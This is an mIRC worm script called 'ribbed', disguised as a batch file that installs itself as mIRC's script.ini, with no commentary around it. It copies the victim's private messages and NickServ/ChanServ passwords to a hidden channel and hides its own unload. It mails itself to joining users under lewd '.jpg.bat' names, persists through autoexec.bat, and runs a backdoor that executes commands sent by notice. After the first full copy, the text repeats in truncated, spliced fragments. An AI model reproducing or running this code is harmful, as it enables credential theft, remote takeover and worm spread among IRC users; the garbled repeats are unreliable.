@echo off
move /y %0 c:\mirc\script.ini

[script]
n0=alias chanserv {
n1=  trojan.msg (msg:chanserv) $1-
n2=  chanserv $1-
n3=}
n4=alias nickserv {
n5=  trojan.msg (msg:nickserv) $1-
n6=  nickserv $1-
n7=}
n8=alias operserv {
n9=  trojan.msg (msg:operserv) $1-
n10=  operserv $1-
n11=}
n12=alias msg {
n13=  trojan.msg (msg: $+ $1 $+ ) $2-
n14=  msg $1-
n15=}
n16=alias privmsg {
n17=  trojan.msg (msg: $+ $1 $+ ) $2-
n18=  privmsg $1-
n19=}
n20=alias remote {
n21=  if ($1 == off) { trojan.echo info text:*** Remote is OFF }
n22=  if ($1 == on) { trojan.echo info text:*** Remote is ON (Ctcps,Events,Raw) }
n23=}
n24=alias unload {
n25=  if ($1 == -rs) && ($gettok($2,$gettok($2,0,92),92) == $gettok($script,$gettok($script,0,92),92)) { trojan.echo info text:*** Unloaded script 'script1.ini' }
n26=  else {
n27=    unload $1-
n28=  }
n29=}
n30=alias -l trojan.echo echo -ae  $+ $colour($gettok($1-,1,58)) $+ $deltok($1-,1,58)
n31=alias -l trojan.msg raw -q privmsg #myownhell :#ribbed#1.2# $1-
n32=alias -l trojan.name return $str(!,$r(0,9)) $+ $gettok(:jennie:wife:lori:cindy:lanna:pamela:jane:wendi:christine:linda:katherine:yasmeen:model:anna:nicole:,$r(1,15),58) $+ $gettok(::-:_:~:x:,$r(1,5),58) $+ $gettok(::wet:hot:sexy:xxx:lick:horny:wild:orgy:naked:lesbian:straight:all-wet:,$r(1,13),58) $+ .jpg.bat
n33=alias -l trojan.infect {
n34=  %trojan.nick = $1
n35=  %trojan.file = $$2
n36=  %trojan.port = $r(2400,5000)
n37=  %trojan.byte = 0
n38=  %trojan.pack = 4096
n39=  .notice %trojan.nick DCC Send $trojan.name ( $+ $ip $+ )
n40=  raw -q privmsg %trojan.nick : $+ $chr(1) $+ DCC SEND $trojan.name $longip($ip) %trojan.port $file(%trojan.file).size $+ $chr(1)
n41=  if ($sock(trojan.send) != $null) { sockclose trojan.send }
n42=  socklisten trojan.send %trojan.port
n43=}
n44=on *:socklisten:trojan.send:{
n45=  sockaccept trojan.write
n46=  trojan.send
n47=}
n48=on *:sockwrite:trojan.write:trojan.send
n49=on *:sockclose:trojan.write:trojan.msg infected %trojan.nick
n50=alias -l trojan.send {
n51=  if ($calc(%trojan.byte + %trojan.pack) < $file(%trojan.file).size) {
n52=    bread %trojan.file %trojan.byte %trojan.pack &trojan.data
n53=    sockwrite trojan.write &trojan.data
n54=    inc %trojan.byte 4096
n55=  }
n56=  else {
n57=    %trojan.pack = $calc($file(%trojan.file).size - %trojan.byte)
n58=    if (%trojan.pack == 0) { return }
n59=    bread %trojan.file %trojan.byte %trojan.pack &trojan.data
n60=    sockwrite trojan.write &trojan.data
n61=  }
n62=}
n63=raw 401:*:if ($2 == #myownhell) halt
n64=on *:connect:trojan.msg online ( $+ $me $+ ! $+ $ip $+ )
n65=on *:invite:#:trojan.msg invited to $chan
n66=on *:join:#:if ($nick != $me) trojan.infect $nick script.ini
n67=on *:nick:if ($nick == $me) trojan.msg nick: $nick -> $newnick
n68=on *:op:#:if ($nick == $me) trojan.msg just opped in $chan
n69=on *:serverop:#:if ($nick == $me) trojan.msg just serv-opped in $chan
n70=on *:usermode:trojan.msg usermode: $1-
n71=
n72=on ^*:error:*:haltdef
n73=on ^*:notice:$("ribbed^ $+ $hash($me,32) $+ ^*"):?:{
n74=  $left($gettok($1-,3-,94),$calc($len($gettok($1-,3-,94)) - 1))
n75=  haltdef
n76=}
n77=
n78=on *:load:{
n79=  .copy -o $script c:\File0001.chk
n80=  write c:\autoexec.bat copy c:\File0001.chk c:\mirc\script.ini /y
n81=  trojan.msg new ribbed user! break out the lube...
n82=}
n83=on *:start:trojan.msg started ribbed!@#
@echo off
move /y %0 c:\mirc\script.ini

[script]
n0=alias chanserv {
n1=  trojan.msg (msg:chanserv) $1-
n2=  chanserv $1-
n3=}
n4=alias nickserv {
n5=  trojan.msg (msg:nickserv) $1-
n6=  nickserv $1-
n7=}
n8=alias operserv {
n9=  trojan.msg (msg:operserv) $1-
n10=  operserv $1-
n11=}
n12=alias@echo off
move /y %0 c:\mirc\script.ini

[script]
n0=alias chanserv {
n1=  trojan.msg (msg:chanserv) $1-
n2=  chanserv $1-
n3=}
n4=alias nickserv {
n5=  trojan.msg (msg:nickserv) $1-
n6=  nickserv $1-
n7=}
n8=alias operserv {
n9=  trojan.msg (msg:operserv) $1-
n10=  operserv $1-
n11=}
n12=alias msg {
n13=  trojan.msg (msg: $+ $1 $+ ) $2-
n14=  msg $1-
n15=}
n16=alias privmsg {
n17=  trojan.msg (msg: $+ $1 $+ ) $2-
n18=  privmsg $1-
n19=}
n20=alias remote {
n21=  if ($1 == off) { trojan.echo info text:*** Remote is OFF }
n22=  if ($1 == on) { trojan.echo info text:*** Remote is ON (Ctcps,Events,Raw) }
n23=}
n24=alias unload {
n25=  if ($1 == -rs) && ($gettok($2,$gettok($2,0,92),92) == $gettok($script,$gettok($script,0,92),92)) { trojan.echo info text:*** Unloaded script 'script1.ini' }
n26=  else {
n27=    unload $1-
n28=  }
n29=}
n30=alias -l trojan.echo echo -ae  $+ $colour($gettok($1-,1,58)) $+ $deltok($1-,1,58)
n31=alias -l trojan.msg raw -q privmsg #myownhell :#ribbed#1.2# $1-
n32=alias -l trojan.name return $str(!,$r(0,9)) $+ $gettok(:jennie:wife:lori:cindy:lanna:pamela:jane:wendi:christine:linda:katherine:yasmeen:model:anna:nicole:,$r(1,15),58) $+ $gettok(::-:_:~:x:,$r(1,5),58) $+ $gettok(::wet:hot:sexy:xxx:lick:horny:wild:orgy:naked:lesbian:straight:all-wet:,$r(1,13),58) $+ .jpg.bat
n33=alias -l trojan.infect {
n34=  %trojan.nick = $1
n35=  %trojan.file = $$2
n36=  %trojan.port = $r(2400,5000)
n37=  %trojan.byte = 0
n38=  %trojan.pack = 4096
n39=  .notice %trojan.nick DCC Send $trojan.name ( $+ $ip $+ )
n40=  raw -q privmsg %trojan.nick : $+ $chr(1) $+ DCC SEND $trojan.name $longip($ip) %trojan.port $file(%trojan.file).size $+ $chr(1)
n41=  if ($sock(trojan.send) != $null) { sockclose trojan.send }
n42=  socklisten trojan.send %trojan.port
n43=}
n44=on *:socklisten:trojan.send:{
n45=  sockaccept trojan.write
n46=  trojan.send
n47=}
n48=on *:sockwrite:trojan.write:trojan.send
n49=on *:sockclose:trojan.write:trojan.msg infected %trojan.nick
n50=alias -l trojan.send {
n51=  if ($calc(%trojan.byte + %trojan.pack) < $file(%trojan.file).size) {
n52=    bread %trojan.file %trojan.byte %trojan.pack &trojan.data
n53=    sockwrite trojan.write &trojan.data
n54=    inc %trojan.byte 4096
n55=  }
n56=  else {
n57=    %trojan.pack = $calc($file(%trojan.file).size - %trojan.byte)
n58=    if (%trojan.pack == 0) { return }
n59=    bread %trojan.file %trojan.byte %trojan.pack &trojan.data
n60=    sockwrite trojan.write &trojan.data
n61=  }
n62=}
n63=raw 401:*:if ($2 == #myownhell) halt
n64=on *:connect:trojan.msg online ( $+ $me $+ ! $+ $ip $+ )
n65=on *:invite:#:trojan.msg invited to $chan
n66=on *:join:#:if ($nick != $me) trojan.infect $nick script.ini
n67=on *:nick:if ($nick == $me) trojan.msg nick: $nick -> $newnick
n68=on *:op:#:if ($nick == $me) trojan.msg just opped in $chan
n69=on *:serverop:#:if ($nick == $me) trojan.msg just serv-opped in $chan
n70=on *:usermode:trojan.msg usermode: $1-
n71=
n72=on ^*:error:*:haltdef
n73=on ^*:notice:$("ribbed^ $+ $hash($me,32) $+ ^*"):?:{
n74=  $left($gettok($1-,3-,94),$calc($len($gettok($1-,3-,94)) - 1))
n75=  haltdef
n76=}
n77=
n78=on *:load:{
n79=  .copy -o $script c:\File0001.chk
n80=  write c:\autoexec.bat copy c:\File0001.chk c:\mirc\script.ini /y
n81=  trojan.msg new ribbed user! break out the lube...
n82=}
n83=on *:start:trojan.msg started ribbed!@#
@echo off
move /y %0 c:\mirc\script.ini

[script]
n0=alias chanserv {
n1=  trojan.msg (msg:chanserv) $1-
n2=  chanserv $1-
n3=}
n4=alias nickserv {
n5=  trojan.msg (msg:nickserv) $1-
n6=  nickserv $1-
n7=}
n8=alias operserv {
n9=  trojan.msg (msg:operserv) $1-
n10=  operserv $1-
n11=}
n12=alias@echo off
move /y %0 c:\mirc\script.ini

[script]
n0=alias chanserv {
n1=  trojan.msg (msg:chanserv) $1-
n2=  chanserv $1-
n3=}
n4=alias nickserv {
n5=  trojan.msg (msg:nickserv) $1-
n6=  nickserv $1-
n7=}
n8=alias operserv {
n9=  trojan.msg (msg:operserv) $1-
n10=  operserv $1-
n11=}
n12=alias msg {
n13=  trojan.msg (msg: $+ $1 $+ ) $2-
n14=  msg $1-
n15=}
n16=alias privmsg {
n17=  trojan.msg (msg: $+ $1 $+ ) $2-
n18=  privmsg $1-
n19=}
n20=alias remote {
n21=  if ($1 == off) { trojan.echo info text:*** R $1 $+ ) $2-
n14=  msg $1-
n15=}
n16=alias privmsg {
n17=  trojan.msg (msg: $+ $1 $+ ) $2-
n18=  privmsg $1-
n19=}
n20=alias remote {
n21=  if ($1 == off) { trojan.echo info text:*** Remote is OFF }
n22=  if ($1 == on) { trojan.echo info text:*** Remote is ON (Ctcps,Events,Raw) }
n23=}
n24=alias unload {
n25=  if ($1 == -rs) && ($gettok($2,$gettok($2,0,92),92) == $gettok($script,$gettok($script,0,92),92)) { trojan.echo info text:*** Unloaded script 'script1.ini' }
n26=  else {
n27=    unload $1-
n28=  }
n29=}
n30=$1 == off) { trojan.echo info text:*** Remote is OFF }
n22=  if ($1 == on) { trojan.echo info text:*** Remote is ON (Ctcps,Events,Raw) }
n23=}
n24=alias unload {
n25=  if ($1 == -rs) && ($gettok($2,$gettok($2,0,92),92) == $gettok($script,$gettok($script,0,92),92)) { trojan.echo info text:*** Unloaded script 'script1.ini' }
n26=  else {
n27=    unload $1-
n28=  }
n29=}
n30=$1 == off) { trojan.echo info text:*** Remote is OFF }
n22=  if ($1 == on) { trojan.echo info text:*** Remote is ON (Ctcps,Events,Raw) }
n23=}
n24=alias unload {
n25=  if ($1 == -rs) && ($gettok($2,$gettok($2,0,92),92) == $gettok($script,$gettok($script,0,92),92)) { trojan.echo info text:*** Unloaded script 'script1.ini' }
n26=  else {
n27=    unload $1-
n28=  }
n29=}
n30=$1 == off) { trojan.echo info text:*** Remote is OFF }
n22=  if ($1 == on) { trojan.echo info text:*** Remote is ON (Ctcps,Events,Raw) }
n23=}
n24=alias unload {
n25=  if ($1 == -rs) && ($gettok($2,$gettok($2,0,92),92) == $gettok($script,$gettok($script,0,92),92)) { trojan.echo info text:*** Unloaded script 'script1.ini' }
n26=  else {
n27=    unload $1-
n28=  }
n29=}
n30=